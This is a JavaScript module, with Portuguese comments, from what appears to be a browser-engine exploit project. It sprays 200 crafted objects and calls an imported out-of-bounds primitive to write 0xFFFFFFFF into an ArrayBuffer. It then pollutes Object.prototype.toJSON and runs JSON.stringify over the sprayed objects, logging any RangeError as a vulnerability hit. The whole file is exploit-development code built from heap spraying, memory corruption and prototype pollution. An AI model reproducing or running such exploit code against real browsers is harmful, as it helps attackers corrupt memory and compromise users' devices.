// js/script3/testReproduceRangeError.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

class MyComplexObject {
    constructor(id) {
        this.id = `MyObj-${id}`;
        this.value1 = 12345;
        this.value2 = "initial_state";
        this.marker = 0xCAFECAFE;
        this.anotherProperty = "clean_state";
        this.propA = "propA_val";
        this.propB = 1000;
        this.propC = true;
        this.propD = { nested: "value_complex_enough_to_trigger_stringify_recursion_if_bugged" };
        this.propE = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100]; // Array um pouco maior
        this.propF = null;
        this.propG = undefined;
    }

    checkIntegrity(loggerFunc = null) { // loggerFunc opcional
        const currentId = this.id || "ID_DESCONHECIDO";
        if (this.marker !== 0xCAFECAFE) {
            if(loggerFunc) loggerFunc(`!! ${currentId} - FALHA INTEGRIDADE! Marcador: ${toHex(this.marker)}`, 'critical', 'checkIntegrity');
            return false;
        }
        return true;
    }
}

// toJSON com for...in completo e atribuição, com logging mínimo para não interferir.
export function toJSON_MinimalForIn_AttemptRangeError() {
    const FNAME_toJSON = "toJSON_MinimalForIn_AttemptRangeError";
    let props_payload = {
        _toJSON_EXECUTED_MARKER_: FNAME_toJSON,
        _id_at_entry_: (this && typeof this.id !== 'undefined' ? String(this.id) : "N/A_OR_NO_ID")
    };
    let iteration_count = 0;
    // console.log(`[${FNAME_toJSON}] Entrando para this.id: ${props_payload._id_at_entry_}`);

    try {
        if (typeof this === 'object' && this !== null) {
            for (const prop in this) { // Itera sobre todas as propriedades enumeráveis
                iteration_count++;
                if (Object.prototype.hasOwnProperty.call(this, prop)) {
                    if (typeof this[prop] !== 'function') {
                        // Operação crítica que suspeitamos causar RangeError
                        props_payload[prop] = String(this[prop]).substring(0, 150); // Aumentar um pouco o substring
                    }
                }
                // Safety break para loops muito longos, mas alto para dar chance ao RangeError
                if (iteration_count > 1000) {
                    // Este log SÓ aparecerá se o RangeError NÃO ocorrer e o loop for genuinamente longo.
                    logS3(`[${FNAME_toJSON}] Loop for...in excedeu 1000 iterações. ID: ${props_payload._id_at_entry_}. Interrompendo.`, "warn", FNAME_toJSON);
                    props_payload._LOOP_BREAK_SAFETY_ = iteration_count;
                    break;
                }
            }
        }
    } catch (e) {
        // Se um erro é pego AQUI, é ANTES do RangeError do stringify, ou é o próprio RangeError se o motor o joga aqui.
        logS3(`[${FNAME_toJSON}] ERRO INTERNO CAPTURADO DENTRO da toJSON: ${e.name} - ${e.message}. ID: ${props_payload._id_at_entry_}`, "error", FNAME_toJSON);
        props_payload._INTERNAL_ERROR_ = `${e.name}: ${e.message}`;
        // Re-throw para que o JSON.stringify externo possa pegar se for um erro fatal
        // No entanto, para RangeError, ele pode já ter estourado a pilha.
        // throw e; // Descomente se quiser que o stringify pegue este erro explicitamente.
    }
    props_payload._iterations_done_ = iteration_count;
    return props_payload;
}


export async function executeAttemptToReproduceRangeError() {
    const FNAME_TEST = `executeAttemptToReproduceRangeError`;
    const toJSONFunctionName = "toJSON_MinimalForIn_AttemptRangeError";
    logS3(`--- Iniciando Teste: Tentativa de Reproduzir RangeError com ${toJSONFunctionName} ---`, "test", FNAME_TEST);
    document.title = `Attempt RangeError - ${toJSONFunctionName}`;

    const spray_count = 200; // Aumentado para sondar mais objetos
    const sprayed_objects = [];

    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    logS3(`1. Pulverizando ${spray_count} instâncias de MyComplexObject...`, "info", FNAME_TEST);
    try {
        for (let i = 0; i < spray_count; i++) {
            sprayed_objects.push(new MyComplexObject(i));
        }
        logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);
    } catch (e_spray) {
        logS3(`ERRO durante a pulverização: ${e_spray.message}. Abortando.`, "error", FNAME_TEST);
        return { setupError: e_spray };
    }

    await PAUSE_S3(SHORT_PAUSE_S3);

    logS3(`2. Configurando ambiente OOB e escrevendo 0xFFFFFFFF em oob_ab[${toHex(corruption_offset_in_oob_ab)}]...`, "info", FNAME_TEST);
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        return { setupError: new Error("OOB Setup Failed")};
    }
    try {
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB realizada.`, "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`   ERRO na escrita OOB: ${e_write.message}. Abortando.`, "error", FNAME_TEST);
        clearOOBEnvironment();
        return { setupError: e_write };
    }

    await PAUSE_S3(SHORT_PAUSE_S3);

    logS3(`3. Sondando até ${spray_count} objetos pulverizados com ${toJSONFunctionName}...`, "test", FNAME_TEST);

    const ppKey_val = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    let rangeErrorOccurred = false;
    let firstErroredObjectId = null;

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_MinimalForIn_AttemptRangeError,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;

        for (let i = 0; i < sprayed_objects.length; i++) {
            const target_obj = sprayed_objects[i];
            if (!target_obj) continue;

            if (i > 0 && i % 20 === 0) { // Log de progresso
                 logS3(`   Sondando objeto ${i}... ID: ${target_obj.id}`, 'info', FNAME_TEST);
                 await PAUSE_S3(5);
            }

            document.title = `Stringify ${target_obj.id} - ${toJSONFunctionName}`;
            try {
                JSON.stringify(target_obj); // PONTO CRÍTICO - não precisamos do resultado, apenas se causa erro
                if (i < 10) { // Log para os primeiros para ver se completam
                    logS3(`     JSON.stringify(obj[${i}], ID: ${target_obj.id}) completou SEM RangeError.`, "info", FNAME_TEST);
                }
            } catch (e_str) {
                logS3(`     !!!! ERRO AO STRINGIFY ${target_obj.id} (index ${i}) !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
                if (e_str.stack) logS3(`       Stack: ${e_str.stack}`, "error");
                if (e_str.name === 'RangeError') {
                    rangeErrorOccurred = true;
                    firstErroredObjectId = target_obj.id;
                    document.title = `RangeError on ${target_obj.id}!`;
                    break; // Sai do loop ao encontrar o primeiro RangeError
                }
            }
            if (rangeErrorOccurred) break;
        }

    } catch (e_main_test_logic) {
        logS3(`Erro na lógica principal do teste: ${e_main_test_logic.message}`, "error", FNAME_TEST);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }

    if (rangeErrorOccurred) {
        logS3(`   ---> RangeError: Maximum call stack size exceeded OCORREU com ${toJSONFunctionName} para o objeto com ID ${firstErroredObjectId}!`, "vuln", FNAME_TEST);
    } else {
        logS3(`   ${toJSONFunctionName} para todos os ${spray_count} objetos sondados (ou até o limite) completou SEM RangeError.`, "warn", FNAME_TEST);
    }

    logS3(`--- Teste Revisitando RangeError Original (Mínima Instrumentação) CONCLUÍDO ---`, "test", FNAME_TEST);
    clearOOBEnvironment();
    sprayed_objects.length = 0;
    globalThis.gc?.();
    document.title = rangeErrorOccurred ? document.title : `Revisit RangeError Original Done (No Hit)`;
}
